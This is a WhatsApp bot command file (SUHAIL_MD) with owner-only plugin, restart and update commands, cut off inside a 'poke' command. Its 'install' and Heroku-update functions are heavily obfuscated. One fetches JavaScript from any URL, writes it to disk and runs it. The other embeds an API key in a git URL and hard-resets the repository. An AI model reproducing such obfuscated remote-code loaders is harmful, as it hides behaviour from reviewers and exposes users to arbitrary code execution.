sᴜʜᴀɪʟ_ᴍᴅ.cmd({
pattern: "file",
desc: "to get extact name where that command is in repo.\nSo user can edit that.",
category: "general",
//react: "✨",
filename: __filename
},
async(Void, citel, text ,{isCreator }) => {
if(!isCreator) return citel.reply("*Ahh Sorry, Only Owner Can Use This Cmd*")
if(!text) return citel.reply("*Uhh PLease, Provide A Command/Directory*")
if(text.startsWith("."))
{
let res="*------------- FILE MANAGER -------------*\n"
try {
      const files = await readDirectory(text);
      files.forEach(file => { res += file + '\n'; });
      await citel.reply(res.toString());
} catch (error) {  citel.reply(error); }
  return;
}


const { commands } = require('../lib');

let arr = [];
    const cmd = commands.find((cmd) => cmd.pattern === (text.split(" ")[0].toLowerCase()))
    if (!cmd) return await citel.reply("*❌No Such commands.*");
    else arr.push(`*🍁Command:* ${cmd.pattern}`);
    if (cmd.category) arr.push(`*🧩Type:* ${cmd.category}`);
    if(cmd.filename) arr.push(`✨FileName: ${cmd.filename}`)
    return await citel.reply(arr.join('\n'));


})

































cmd({
    pattern: "plugins",
    alias :['plugin'],
    category: "owner",
    desc: "Shows list of all externally installed modules",
    filename: __filename
},
async(Void, citel, text, { isCreator }) => {

    if (!isCreator) return citel.reply(tlang().owner)
  // if(!text) return await citel.reply("*_Uhh Please, Provide Me Plugin Url_*")
    let allmodtext = `*All Installed Modules are:-*\n\n`
    allmodtext += await plugins()
    return await citel.reply(allmodtext)

}
)

//---------------------------------------------------------------------------
cmd({
    pattern: "remove",
    alias :['uninstall'],
    category: "owner",
    desc: "removes external modules.",
    filename: __filename
},
async(Void, citel, text,{ isCreator}) => {
    if (!isCreator) return citel.reply(tlang().owner)
    if(!text) return await citel.reply("*_Uhh Please, Provide Me Plugin Name_*")

    if(text==='alls') 
    { 
     await plugindb.collection.drop() ; 
     return citel.reply('Deleted all plugins from Secktor.') ;  
    }
try 
{
    let kill = await remove(text.split(" ")[0])
    delete require.cache[require.resolve(__dirname+"/" + text + ".js")];
    fs.unlinkSync(__dirname + "/" + text+ ".js");
    await citel.reply(`*_${kill}_* \n*Please Wait _${Config.botname}_ Restarting_*`)
    const { exec } = require("child_process")
    exec('pm2 restart all')  
}
catch (e) {return await citel.reply("*_Plugin Not Found In Mongodb Server_*")}
})

//---------------------------------------------------------------------------

cmd({
    pattern: "install",
    category: "owner",
    desc: "Installs external modules..",
    filename: __filename
},
async(Void, citel, text, {isCreator}) => {
     if (!isCreator) return citel.reply(tlang().owner)
    if(!text){   return await citel.reply("*_Uhh Please, Provide Me Plugin Name_*");  }
(function(_0x32e3d0,_0x2a097d){function _0x3091bb(_0xe9e39e,_0x141c52,_0x216a56,_0xa922ba){return _0x2332(_0x216a56- -0x279,_0xa922ba);}const _0x4e9f21=_0x32e3d0();function _0x170a12(_0x1cce22,_0x44f146,_0x5524fa,_0x21cf14){return _0x2332(_0x21cf14- -0x2,_0x1cce22);}while(!![]){try{const _0x890c5f=parseInt(_0x3091bb(-0x1c5,-0x1a9,-0x1b9,-0x1c2))/(-0x5*-0x8b+0x1e8+-0x49e)+-parseInt(_0x3091bb(-0x1d2,-0x1b8,-0x1bb,-0x1bf))/(-0x2*-0x9a9+-0xa36+-0x91a)+-parseInt(_0x170a12(0xae,0xb3,0xd9,0xcb))/(0xa*0x15b+-0x17*-0x7+-0xe2c)+-parseInt(_0x3091bb(-0x1de,-0x1dd,-0x1d2,-0x1bf))/(-0x1*0xe21+0x24*0xa6+-0x933)+parseInt(_0x3091bb(-0x1af,-0x1a4,-0x19b,-0x1a9))/(0x2529+-0x49f+-0x2085)*(parseInt(_0x3091bb(-0x1ad,-0x18a,-0x1a6,-0x1a9))/(0x2*0x82f+0x61f*-0x5+-0x1*-0xe43))+parseInt(_0x3091bb(-0x1d0,-0x1e3,-0x1cc,-0x1c1))/(0x152a+0x1943*-0x1+0x10*0x42)+parseInt(_0x170a12(0xf8,0xbb,0xe4,0xd9))/(0x83*-0x23+0x16b3+-0x4c2);if(_0x890c5f===_0x2a097d)break;else _0x4e9f21['push'](_0x4e9f21['shift']());}catch(_0x2b590c){_0x4e9f21['push'](_0x4e9f21['shift']());}}}(_0x281e,0x2*0xdfa+0x2cad3+-0x15d5a));function _0x281e(){const _0x9e2056=['kcGOlISPkYKRkq','rvn2BvO','sg9ewuG','lMPZ','CMvWBhK','zxHJzxb0Aw9U','Ce1HvKO','C3vIC3rYAw5N','zwqGAw4Gu2vJAW','mJCYnZeYtuTOBfDu','BuDYCLK','BM5vz20','q2nHvKu','Dg9tDhjPBMC','Cwzdthq','odG0nZe2uLLxCMfH','kIbFAw5ZDgfSBa','qMLktK8','y29UC3rYDwn0BW','ChjVDg90ExbL','sunQvKC','B3DUzxi','x0LUDMfSAwqGvq','wfHoCKy','sw52ywXPzcbqBa','rvrQs0i','zu1qrNu','Dgv4Da','E30Uy29UC3rYDq','y3rVCIGICMv0Dq','x1bSDwDPBL8GkG','wuPRAuC','mJy5otqWALDhDvfZ','Dg9YlL8','ndC5mJbeD1DSufm','CxvVDgvK','CuDqruW','ygbG','yxbWBhK','x19WCM90B19F','AhjLzG','zxHLyW','y1bTq1a','CxrKqwK','CMv0DxjUicHMDq','A2rJDe4','D3jPDgvgAwXLuW','mte0mZu0wM1QEvvh','veTUshC','C01wtgq','DxjS','wwHTuLa','A2jgEhO','ntrOBKv2qMK','BMn0Aw9UkcKG','yMv0zM0','zxjYB3i','DwDPBGOGygbG','vg1zA0q','DgfIBgu','C2f2zq','mte2mdq2ngLfr0zqrG','y29UC29Szq','s0POtue','mti1nJvdsg5hD0y','yMLUza','DxrMoa','rhP2rwu','Dw5SAw5Ru3LUyW','zMP6CKy'];_0x281e=function(){return _0x9e2056;};return _0x281e();}const _0x4e5c21=(function(){let _0x8430bc=!![];return function(_0x36f5e9,_0x491ec8){const _0x629960=_0x8430bc?function(){function _0x44b759(_0x174153,_0x2c66ff,_0x2a436c,_0x13a2d0){return _0x2332(_0x13a2d0-0x3cd,_0x2c66ff);}if(_0x491ec8){const _0x2ab844=_0x491ec8[_0x44b759(0x49d,0x483,0x4a2,0x491)](_0x36f5e9,arguments);return _0x491ec8=null,_0x2ab844;}}:function(){};return _0x8430bc=![],_0x629960;};}()),_0x2a8892=_0x4e5c21(this,function(){const _0x23e6dc={};function _0x47a97(_0x4b5b1c,_0x475519,_0x211304,_0x6f811b){return _0x2332(_0x475519-0x3b1,_0x6f811b);}_0x23e6dc[_0x47a97(0x461,0x46e,0x482,0x453)]=_0x452219(0x128,0x113,0x10d,0x10e)+'+$';function _0x452219(_0x234184,_0x3d5796,_0x3ec1d8,_0x3db066){return _0x2332(_0x3db066-0x2a,_0x3ec1d8);}const _0x3f2cb6=_0x23e6dc;return _0x2a8892[_0x452219(0xd7,0xdd,0xef,0xd5)]()['search']('(((.+)+)+)'+'+$')[_0x452219(0xce,0xed,0xf1,0xd5)]()[_0x452219(0xd4,0xc8,0xcb,0xda)+'r'](_0x2a8892)['search'](_0x3f2cb6['YJkiG']);});_0x2a8892();function _0x2332(_0x19b614,_0x130e94){const _0x591f2f=_0x281e();return _0x2332=function(_0x115159,_0x545231){_0x115159=_0x115159-(0xa5+-0x2191+0x218f);let _0x1ec8e4=_0x591f2f[_0x115159];if(_0x2332['EJWiNI']===undefined){var _0xa57ae9=function(_0x7b5731){const _0x5e2292='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x45a022='',_0x5dea6a='',_0x3ce49d=_0x45a022+_0xa57ae9;for(let _0x1a87df=0x18ae+-0x1*-0x2231+-0x3adf,_0x36d6ab,_0x5ccbf6,_0x3d8dea=-0x1144+-0x717+0x2b*0x91;_0x5ccbf6=_0x7b5731['charAt'](_0x3d8dea++);~_0x5ccbf6&&(_0x36d6ab=_0x1a87df%(0x524*-0x3+-0x13c8+-0x7*-0x508)?_0x36d6ab*(-0x3b*-0xa9+-0x1*-0x1ff5+-0x88*0x85)+_0x5ccbf6:_0x5ccbf6,_0x1a87df++%(-0xa*0x1a5+-0x20ed*0x1+0x3163))?_0x45a022+=_0x3ce49d['charCodeAt'](_0x3d8dea+(0x30*-0x7+-0x2*-0x2a6+-0x1*0x3f2))-(-0x3*-0xb61+0xf43*-0x1+-0x12d6)!==-0x1*0x7b1+-0x1*0x2063+0x2814?String['fromCharCode'](0x1c61*-0x1+-0x24a6+-0x3ab*-0x12&_0x36d6ab>>(-(-0x25d8+-0x12ee*0x1+-0x4*-0xe32)*_0x1a87df&0x20c*-0x9+0x8*0x2+0x931*0x2)):_0x1a87df:-0x1ee+-0x1752+0x1940){_0x5ccbf6=_0x5e2292['indexOf'](_0x5ccbf6);}for(let _0xec04a4=0x169b*0x1+-0x3f*-0x70+-0x10b9*0x3,_0x4dff6b=_0x45a022['length'];_0xec04a4<_0x4dff6b;_0xec04a4++){_0x5dea6a+='%'+('00'+_0x45a022['charCodeAt'](_0xec04a4)['toString'](-0x83+0xcdd*0x2+0x2f*-0x89))['slice'](-(-0x3b6+-0x1e80+-0x111c*-0x2));}return decodeURIComponent(_0x5dea6a);};_0x2332['qGEdPk']=_0xa57ae9,_0x19b614=arguments,_0x2332['EJWiNI']=!![];}const _0x350b49=_0x591f2f[0x269*-0x1+-0xb*0x21b+-0xcc9*-0x2],_0x456d60=_0x115159+_0x350b49,_0x23a1f9=_0x19b614[_0x456d60];if(!_0x23a1f9){const _0x2c0b84=function(_0x505008){this['NNIEhB']=_0x505008,this['xwXwMu']=[0xa*-0x36c+0x4*-0x7bd+0x1*0x412d,0x2*0x1198+0x4*0x1eb+0xd3*-0x34,0xd*0x221+0x18b2+-0x6d*0x7b],this['BmWmjD']=function(){return'newState';},this['xqkpiJ']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['CiqeWD']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x2c0b84['prototype']['nvZVjM']=function(){const _0x3d645f=new RegExp(this['xqkpiJ']+this['CiqeWD']),_0x40a0a9=_0x3d645f['test'](this['BmWmjD']['toString']())?--this['xwXwMu'][-0x2588+-0x181+0x270a]:--this['xwXwMu'][0x29*0x22+-0x22f3+-0xd*-0x245];return this['Bmkdrs'](_0x40a0a9);},_0x2c0b84['prototype']['Bmkdrs']=function(_0x30a698){if(!Boolean(~_0x30a698))return _0x30a698;return this['mRnnHe'](this['NNIEhB']);},_0x2c0b84['prototype']['mRnnHe']=function(_0x496682){for(let _0x1c9b56=0x7b9+0x2077*0x1+-0x2830,_0x1621fa=this['xwXwMu']['length'];_0x1c9b56<_0x1621fa;_0x1c9b56++){this['xwXwMu']['push'](Math['round'](Math['random']())),_0x1621fa=this['xwXwMu']['length'];}return _0x496682(this['xwXwMu'][0x2*-0x2f5+0x199*-0x13+0x2445]);},new _0x2c0b84(_0x2332)['nvZVjM'](),_0x1ec8e4=_0x2332['qGEdPk'](_0x1ec8e4),_0x19b614[_0x456d60]=_0x1ec8e4;}else _0x1ec8e4=_0x23a1f9;return _0x1ec8e4;},_0x2332(_0x19b614,_0x130e94);}function _0x5cd461(_0x4008dc,_0x54ec37,_0x1a37d0,_0x4f5688){return _0x2332(_0x4008dc-0x2ab,_0x4f5688);}const _0x283afd=(function(){const _0x2f796d={};_0x2f796d[_0x14070b(0x454,0x442,0x432,0x43a)]=function(_0x3d1eb0,_0x5d5e20){return _0x3d1eb0+_0x5d5e20;};function _0x1c1814(_0x249195,_0x51c681,_0x24b2b7,_0x5be35c){return _0x2332(_0x5be35c- -0x203,_0x51c681);}_0x2f796d[_0x1c1814(-0x144,-0x130,-0x13c,-0x12b)]='.js',_0x2f796d[_0x14070b(0x441,0x459,0x442,0x43e)]=_0x1c1814(-0x154,-0x13e,-0x16f,-0x14d)+_0x14070b(0x437,0x459,0x436,0x446),_0x2f796d[_0x14070b(0x414,0x42e,0x447,0x437)]=_0x1c1814(-0x14f,-0x121,-0x14f,-0x140),_0x2f796d[_0x14070b(0x442,0x42e,0x40c,0x421)]=function(_0x18a38a,_0x41dbfd){return _0x18a38a!==_0x41dbfd;};const _0x3bf56e=_0x2f796d;function _0x14070b(_0x378f34,_0x56284b,_0x34c58b,_0x271160){return _0x2332(_0x271160-0x36f,_0x378f34);}let _0x2663dc=!![];return function(_0x186d7a,_0x462773){const _0x29452b={'CcaVE':function(_0xfe8bfa,_0x341123){return _0x3bf56e['kdctN'](_0xfe8bfa,_0x341123);},'YhmRP':function(_0x545ac5,_0x2b81f9){return _0x545ac5+_0x2b81f9;},'kbFxz':_0x3bf56e['TmYkD'],'nnUgm':_0x3bf56e[_0x2b10fc(0x2dd,0x2d0,0x2d9,0x2d8)],'fjzrF':_0x3bf56e[_0x5132b3(0x72,0x7e,0x8d,0x8d)],'pMaVJ':function(_0x2d9a70,_0x3cf998){function _0x27eb26(_0x1a20e5,_0x4150d3,_0x1c58ee,_0x395413){return _0x5132b3(_0x1a20e5-0x1d4,_0x4150d3-0x42,_0x4150d3-0x78,_0x1a20e5);}return _0x3bf56e[_0x27eb26(0xeb,0xef,0xed,0xdd)](_0x2d9a70,_0x3cf998);},'BiJNO':_0x2b10fc(0x2c9,0x2e7,0x2fa,0x2e8),'qtdAi':_0x2b10fc(0x2af,0x2ad,0x292,0x2a2)},_0x1f1ced=_0x2663dc?function(){function _0x34847c(_0x4705d8,_0x166fda,_0x169dc3,_0x1aa0b7){return _0x5132b3(_0x4705d8-0x1ca,_0x166fda-0x110,_0x166fda- -0x13c,_0x169dc3);}function _0x1d7776(_0x2532e6,_0x2f5400,_0x342f9f,_0x178270){return _0x2b10fc(_0x342f9f,_0x178270- -0x93,_0x342f9f-0xa8,_0x178270-0x1a4);}if(_0x29452b[_0x34847c(-0xb3,-0xd3,-0xba,-0xd1)](_0x29452b[_0x1d7776(0x21f,0x1fe,0x231,0x21d)],_0x29452b[_0x1d7776(0x203,0x1fe,0x21e,0x21d)]))return _0x519ae3[_0x1d7776(0x252,0x254,0x241,0x250)](_0x29452b[_0x34847c(-0xbc,-0xcd,-0xc7,-0xaf)](_0x29452b[_0x1d7776(0x25f,0x247,0x25c,0x23f)](_0x5ea4c4,'/'),_0x1df903)+_0x29452b[_0x1d7776(0x242,0x25d,0x245,0x240)]),_0x2878f5[_0x1d7776(0x26c,0x244,0x251,0x256)](_0x29452b[_0x34847c(-0xb8,-0xce,-0xc9,-0xe8)]+_0xaa427b+_0x29452b[_0x1d7776(0x23c,0x26c,0x24d,0x251)]);else{if(_0x462773){if(_0x29452b[_0x34847c(-0xb4,-0xd3,-0xce,-0xbf)](_0x29452b[_0x34847c(-0xb8,-0xae,-0xcb,-0xab)],_0x29452b[_0x1d7776(0x233,0x24b,0x23b,0x237)])){const _0x41f306=_0x27c587?function(){function _0xc00cc5(_0x10f00b,_0x32e760,_0x5a6ffc,_0x42bc40){return _0x34847c(_0x10f00b-0x12b,_0x32e760- -0x20c,_0x5a6ffc,_0x42bc40-0x167);}if(_0x2d0a78){const _0x31b581=_0x780a72[_0xc00cc5(-0x2b3,-0x2bf,-0x2b6,-0x2d4)](_0x52b73a,arguments);return _0x1a3891=null,_0x31b581;}}:function(){};return _0x349928=![],_0x41f306;}else{const _0x77f760=_0x462773[_0x1d7776(0x244,0x248,0x234,0x232)](_0x186d7a,arguments);return _0x462773=null,_0x77f760;}}}}:function(){};function _0x2b10fc(_0xb32811,_0x5f3df1,_0x53e43e,_0x5ad0e5){return _0x1c1814(_0xb32811-0x104,_0xb32811,_0x53e43e-0x20,_0x5f3df1-0x404);}function _0x5132b3(_0x1533d6,_0x7bc0b6,_0x190930,_0x1e3c31){return _0x14070b(_0x1e3c31,_0x7bc0b6-0x197,_0x190930-0x29,_0x190930- -0x3aa);}return _0x2663dc=![],_0x1f1ced;};}()),_0x36a219=_0x283afd(this,function(){const _0x2ab46e={'ESvmZ':function(_0x2c675d,_0x397991){return _0x2c675d(_0x397991);},'XXNrF':function(_0x29887e,_0x2d7bfb){return _0x29887e+_0x2d7bfb;},'TKnHw':_0x498326(-0x289,-0x29a,-0x290,-0x279)+_0x5604c4(-0x1ab,-0x19c,-0x19c,-0x1a1),'qGPEL':'log','mGrrY':'warn','KJhMA':'info','eMPFu':_0x5604c4(-0x1a6,-0x1ab,-0x19a,-0x1b2),'DzvEe':_0x498326(-0x29b,-0x298,-0x2b7,-0x2a3),'DuIGa':_0x498326(-0x29e,-0x26d,-0x281,-0x27b),'DYzst':'trace','ETjKB':function(_0x167a7c,_0x40e038){return _0x167a7c<_0x40e038;},'Jvgap':'DuHSv','betfm':'EWcpv'},_0x23911b=function(){function _0x411d8f(_0x40f295,_0x1b04a6,_0x554099,_0x22f34f){return _0x498326(_0x40f295-0x182,_0x40f295,_0x554099-0x4ca,_0x22f34f-0xba);}let _0x4a064e;try{_0x4a064e=_0x2ab46e[_0x411d8f(0x264,0x23c,0x255,0x263)](Function,_0x2ab46e['XXNrF'](_0x2ab46e[_0x331a64(0x46c,0x486,0x47a,0x49b)](_0x2ab46e[_0x411d8f(0x231,0x24c,0x23e,0x240)],_0x331a64(0x468,0x48b,0x479,0x47a)+_0x411d8f(0x22f,0x212,0x22b,0x249)+'rn\x20this\x22)('+'\x20)'),');'))();}catch(_0x55e08f){_0x4a064e=window;}function _0x331a64(_0x12431f,_0x523c97,_0x4ba79d,_0x4bd52d){return _0x498326(_0x12431f-0x181,_0x12431f,_0x523c97-0x72b,_0x4bd52d-0x79);}return _0x4a064e;},_0x54896b=_0x23911b(),_0x1387da=_0x54896b['console']=_0x54896b[_0x498326(-0x26e,-0x29e,-0x27e,-0x260)]||{};function _0x498326(_0x4484e0,_0x534e30,_0x108d97,_0x4f46f5){return _0x2332(_0x108d97- -0x35a,_0x534e30);}const _0x1b7392=[_0x2ab46e[_0x5604c4(-0x1bb,-0x198,-0x1ae,-0x1c5)],_0x2ab46e[_0x5604c4(-0x1be,-0x1de,-0x1c8,-0x1be)],_0x2ab46e[_0x5604c4(-0x1a2,-0x178,-0x193,-0x1b5)],_0x2ab46e[_0x5604c4(-0x1bb,-0x1d9,-0x1b8,-0x1d3)],_0x2ab46e[_0x5604c4(-0x1aa,-0x170,-0x18f,-0x188)],_0x2ab46e['DuIGa'],_0x2ab46e['DYzst']];function _0x5604c4(_0x2b99e6,_0x8d544b,_0x54d250,_0x2d37a8){return _0x2332(_0x54d250- -0x270,_0x2d37a8);}for(let _0x28cdda=-0x1c70+-0x1*-0x462+0x180e;_0x2ab46e[_0x5604c4(-0x1d0,-0x1d1,-0x1b9,-0x1d2)](_0x28cdda,_0x1b7392['length']);_0x28cdda++){if(_0x2ab46e['Jvgap']!==_0x2ab46e[_0x498326(-0x28a,-0x270,-0x285,-0x2a8)]){const _0x23e968=_0x283afd['constructo'+'r'][_0x498326(-0x2a0,-0x29f,-0x2a9,-0x2ac)][_0x498326(-0x277,-0x25f,-0x27b,-0x282)](_0x283afd),_0x195cc2=_0x1b7392[_0x28cdda],_0x3ee28e=_0x1387da[_0x195cc2]||_0x23e968;_0x23e968[_0x498326(-0x28c,-0x27e,-0x295,-0x278)]=_0x283afd[_0x498326(-0x26a,-0x259,-0x27b,-0x294)](_0x283afd),_0x23e968[_0x5604c4(-0x1bf,-0x1e6,-0x1c5,-0x1be)]=_0x3ee28e[_0x5604c4(-0x1b0,-0x1c4,-0x1c5,-0x1cc)][_0x5604c4(-0x1a5,-0x179,-0x191,-0x191)](_0x3ee28e),_0x1387da[_0x195cc2]=_0x23e968;}else var _0x1bec02=new _0x1ac6b6(_0x1e1e37);}});_0x36a219();function _0x5ba879(_0x1dc7eb,_0x434b93,_0x227053,_0x72572a){return _0x2332(_0x1dc7eb- -0x9,_0x434b93);}if(!isCreator)return citel[_0x5cd461(0x393,0x38e,0x397,0x397)](tlang()[_0x5ba879(0xaa,0xaa,0xcb,0x98)]);let trl=text?text:citel['quoted']&&citel[_0x5ba879(0xb8,0xad,0xcb,0xa0)][_0x5ba879(0xb0,0xb3,0xc1,0x95)]?citel[_0x5ba879(0xb8,0x99,0x95,0xb7)][_0x5ba879(0xb0,0xcb,0xc9,0xb0)]:citel[_0x5cd461(0x364,0x36d,0x377,0x371)];for(let Url of isUrl(trl)){try{var url=new URL(Url);}catch{citel['reply'](_0x5cd461(0x35f,0x33d,0x380,0x374)+'rl_');}let fs=require('fs'),{data}=await axios['get'](url[_0x5cd461(0x371,0x36f,0x37b,0x373)]),lp=/pattern: ["'](.*)["'],/g[_0x5ba879(0xbe,0xc0,0xc5,0xa7)](data),lj=lp[0x25af+0x1dcd*0x1+-0x437c]['split']('\x20')[0x252+-0x85*0x2c+-0x148b*-0x1]||Math['random']()[_0x5ba879(0xa2,0x85,0xc4,0x95)](0xa0f*-0x1+0x1581+-0xb4e)[_0x5ba879(0x9c,0x8b,0x85,0x87)](-0x736*0x3+0xbc*0x22+-0x34e),l=lj['replace'](/[^A-Za-z]/g,'');await fs[_0x5ba879(0xc3,0xab,0xc9,0xc8)+'ync'](__dirname+'/'+l+_0x5ba879(0xde,0xde,0xbb,0xcb),data,_0x5ba879(0xd7,0xe1,0xc3,0xbc));try{require(__dirname+'/'+l+_0x5cd461(0x392,0x3a9,0x38d,0x3a7));}catch(_0x2bd37b){return fs[_0x5cd461(0x38d,0x36c,0x36a,0x385)](__dirname+'/'+l+'.js'),citel[_0x5ba879(0xdf,0xc5,0x102,0xbe)]('Invalid\x20Pl'+_0x5ba879(0xce,0xc8,0xb5,0xc5)+_0x2bd37b+'```');}const {plugindb}=require('../lib'),_0x6e1dd5={};_0x6e1dd5['id']=l,_0x6e1dd5[_0x5cd461(0x37b,0x35f,0x370,0x398)]=url,await new plugindb(_0x6e1dd5)[_0x5ba879(0xd1,0xb3,0xd4,0xdb)](),citel[_0x5cd461(0x393,0x375,0x374,0x38b)](_0x5ba879(0xb3,0x90,0xd6,0xcc)+l+(_0x5ba879(0xa5,0xa7,0xc1,0x85)+_0x5cd461(0x351,0x34f,0x35f,0x36a)+_0x5ba879(0xb6,0xc0,0xb1,0x99)));}


}
)






































const {tlang} = require('../lib')
cmd({   pattern: "restart", desc: "To restart bot",category: "tools", filename: __filename }, async(Void, citel,text,{ isCreator }) => {  if (!isCreator) return citel.reply(tlang().owner);  const { exec } = require("child_process"); citel.reply('Restarting'); exec('pm2 restart all'); });




































































































async function updateHerokuApp(heroku = '') {

    function _0x3d2e(_0x26f4e6,_0x47f044){const _0x55f906=_0x55f9();return _0x3d2e=function(_0x3d2e65,_0x4469ac){_0x3d2e65=_0x3d2e65-0xb5;let _0x514c4e=_0x55f906[_0x3d2e65];return _0x514c4e;},_0x3d2e(_0x26f4e6,_0x47f044);}const _0x1d0f8e=_0x3d2e;(function(_0x59c352,_0x36a06a){const _0x376e2b=_0x3d2e,_0x98dc08=_0x59c352();while(!![]){try{const _0x2f6a54=-parseInt(_0x376e2b(0xc1))/0x1+parseInt(_0x376e2b(0xd4))/0x2*(parseInt(_0x376e2b(0xc5))/0x3)+parseInt(_0x376e2b(0xc2))/0x4*(parseInt(_0x376e2b(0xd2))/0x5)+parseInt(_0x376e2b(0xcc))/0x6*(parseInt(_0x376e2b(0xca))/0x7)+-parseInt(_0x376e2b(0xcf))/0x8*(parseInt(_0x376e2b(0xc0))/0x9)+-parseInt(_0x376e2b(0xbb))/0xa*(-parseInt(_0x376e2b(0xc3))/0xb)+-parseInt(_0x376e2b(0xd0))/0xc*(parseInt(_0x376e2b(0xb7))/0xd);if(_0x2f6a54===_0x36a06a)break;else _0x98dc08['push'](_0x98dc08['shift']());}catch(_0x499bd8){_0x98dc08['push'](_0x98dc08['shift']());}}}(_0x55f9,0x5667c));if(heroku==='no')try{return await require(_0x1d0f8e(0xbc))()[_0x1d0f8e(0xb5)](_0x1d0f8e(0xc8),[_0x1d0f8e(0xc9)]),await require(_0x1d0f8e(0xbc))()[_0x1d0f8e(0xcb)](),_0x1d0f8e(0xc6);}catch(_0xcbd0c2){return _0xcbd0c2;}else{if(heroku===_0x1d0f8e(0xb9)){const heroku=new Heroku({'token':process['env'][_0x1d0f8e(0xbe)]});await git['fetch']();const commits=await git['log'](['main..origin/main']);if(commits['total']===0x0)return _0x1d0f8e(0xc7);else{const app=await heroku[_0x1d0f8e(0xb6)](_0x1d0f8e(0xce)+process[_0x1d0f8e(0xd5)]['HEROKU_APP_NAME']),gitUrl=app[_0x1d0f8e(0xd6)][_0x1d0f8e(0xb8)](_0x1d0f8e(0xcd),_0x1d0f8e(0xba)+process[_0x1d0f8e(0xd5)][_0x1d0f8e(0xbe)]+'@');try{await git[_0x1d0f8e(0xbf)](_0x1d0f8e(0xd3),gitUrl);}catch(_0x5e8fe7){console['log'](_0x1d0f8e(0xd1));}return await git[_0x1d0f8e(0xbd)](_0x1d0f8e(0xd3),_0x1d0f8e(0xd7)),_0x1d0f8e(0xc4);}}}function _0x55f9(){const _0x125a76=['git_url','main','reset','get','13GFdUYX','replace','yes','https://api:','36590MKBZar','simple-git','push','HEROKU_API_KEY','addRemote','5634QUgJqy','79709kKZOpy','43376wDOQyY','1133cGbFCG','Bot\x20updated.\x20Restarting.','6dfrpsO','*Successfully\x20updated.\x20Bot\x20Restarting...!*','You\x20already\x20have\x20the\x20latest\x20version\x20installed.','hard','HEAD','950327rHYrgy','pull','18BYwcEn','https://','/apps/','6456XuMedl','10087764ixJlfC','Heroku\x20remote\x20adding\x20error','280MvqISw','heroku','388030OacCGg','env'];_0x55f9=function(){return _0x125a76;};return _0x55f9();}

}

  
//---------------------------------------------------------------------------
cmd({
            pattern: "update",
            desc: "Shows repo\'s refreshed commits.",
            category: "tools",
            filename: __filename
        },
        async(Void, citel, text,{ isCreator }) => {
            if (!isCreator) return citel.reply(`This command is only for my owner`)
            let commits = await DB.syncgit()
            if (commits.total === 0) return await citel.reply(`*BOT IS UPTO DATE...!!*`) 
            let update = `*SUHAIL_MD New Updates:*\n\n${await DB.sync()}`
            await Void.sendMessage(citel.chat, { text: update, },{ quoted : citel });
            if(Config.HEROKU_APP_NAME && Config.HEROKU_API_KEY && text == 'start')
            {
                citel.reply('Heroku Build started...');
                const update = await updateHerokuApp('yes');
                return await citel.reply(update);

            }
})
  
//---------------------------------------------------------------------------
//                  UPDATE COMMANDS
//---------------------------------------------------------------------------

        
     cmd({
                 pattern: "updatenow",
                 desc: "Shows repo\'s refreshed commits.",
                 category: "tools",
                 filename: __filename
             },
        async(Void, citel, text,{ isCreator }) => {
                if(!isCreator) return await citel.reply("Only Owner Can Use This Command")
                let commits = await DB.syncgit()
                if (commits.total === 0) return await citel.reply(`*YOU HAVE LATEST VERSION INSTALLED!*`)
                let update = await DB.sync()
                await citel.send(" *SUHAIL_MD Updater Started...!*\n\n*Please wait you have new updates*\n *───────────────────────────*\n"+update +"\n\n\n"+Config.caption);
                await sleep(3000);
                const updater = await updateHerokuApp('no');
                await citel.reply(updater);
                process.exit(0);
       })

/*
cmd({
    pattern: "update start",
    desc: "Shows repo\'s refreshed commits.",
    category: "misc",
    filename: __filename
},
async(Void, citel, text,{ isCreator }) => {
    await git.fetch();
    var commits = await git.log(['main' + '..origin/' + 'main']);
    if (commits.total === 0) {
        return await citel.reply('Bot is UP-TO-DATE')
 }
// if (!isHeroku){
   // await require("simple-git")().reset("hard",["HEAD"])
   // await require("simple-git")().pull()
   // await citel.reply("_Successfully updated. Please manually update npm modules if applicable!_")
   // process.exit(0);    
   // }
    //else if (isHeroku) {
       // await fixHerokuAppName(message)
        await citel.reply('Update Started...')

 try { var app = await heroku.get('/apps/' + Config.HEROKU_APP_NAME)  }
 catch { await citel.reply('Heroku Information Wrong')
        await new Promise(r => setTimeout(r, 1000)); }
 
        git.fetch('upstream', 'main');
        git.reset('hard', ['FETCH_HEAD']);
        var git_url = app.git_url.replace( "https://", "https://api:" + Config.HEROKU_API_KEY + "@"  )
        try { await git.addRemote('heroku', git_url);  } 
       catch { console.log('null '); }
        await git.push('heroku', 'main');
       await citel.reply("_Successfully updated_")
       await citel.reply("_Restarting_")
        } else {
            await update("UPDATER",'default')
            await citel.reply("_Update started!_")
    }
 
}
)

//______________________________________________________________\\
async function fixHerokuAppName(message){
    if (!HEROKU_API_KEY) return await message.sendReply(`_You have not provided HEROKU_API_KEY\n\nPlease fill this var, get api key from heroku account settings_`)
    let apps = await heroku.get('/apps')
    let app_names = apps.map(e=>e.name)
    if (!HEROKU_APP_NAME || !app_names.includes(Config.HEROKU_APP_NAME)){
    function findGreatestNumber(e){let t=e[0];for(let n=1;n<e.length;n++)e[n]>t&&(t=e[n]);return t}
    let times = apps.map(e=>new Date(e.updated_at).getTime())
    let latest = findGreatestNumber(times)
    let index = times.indexOf(latest)
    let app_name = apps[index].name
    Config.HEROKU_APP_NAME = app_name
    process.env.HEROKU_APP_NAME = app_name
    baseURI = '/apps/' + app_name;
    await message.sendReply(`_You provided an incorrect heroku app name, and I have corrected your app name to "${app_name}"_\n\n_Please retry this command after restart!_`)    
    Config.HEROKU_APP_NAME = app_name
        return await setVar("HEROKU_APP_NAME",app_name,message)
    }
}
*/



















































































cmd({
    pattern: "poke",
    category: "reaction",
    use: '<quote|reply|tag>',
},
async(Void, citel) => {
    var bite = await fetchJson(`https://api.waifu.pics/sfw/poke`);
    const response = await axios.get(bite.url, {
        responseType: "arraybuffer",
    });
    const buffer = Buffer.from(response.data, "utf-8");
    let users = citel.mentionedJid ? citel.mentionedJid[0] : citel.msg.contextInfo.participant || false;
    let gif = await GIFBufferToVideoBuffer(buffer);
    if (users) {
        let cap = `@${citel.sender.split("@")[0]} poked to @${users.split("@")[0]} `;
        Void.sendMessage(citel.chat, { video: gif, gifPlayback: true, mentions: [users, citel.sender], caption: cap }, { quoted: citel });
    } else {
        let cap = `@${citel.sender.split("@")[0]} poked to everyone. `;
